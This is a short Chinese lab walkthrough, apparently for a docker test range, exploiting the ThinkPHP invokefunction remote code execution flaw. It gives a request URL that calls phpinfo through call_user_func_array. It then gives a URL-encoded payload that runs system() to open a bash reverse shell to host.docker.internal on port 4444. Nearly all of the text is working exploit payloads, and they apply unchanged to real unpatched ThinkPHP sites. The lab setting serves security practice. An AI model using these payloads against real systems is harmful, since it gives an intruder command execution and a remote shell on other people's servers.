启动靶场：
```
docker compose up -d
```
一样修改URL
```
http://localhost:18080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```
即可进入PHP的信息页面

反弹shell
修改`vars[0]`和`vars[1][]`
```
http://localhost:18080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/host.docker.internal/4444%200%3E%261%22
```
修改了
`vars[0]=system`

`vars[1][]=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/host.docker.internal/4444%200%3E%261%22`

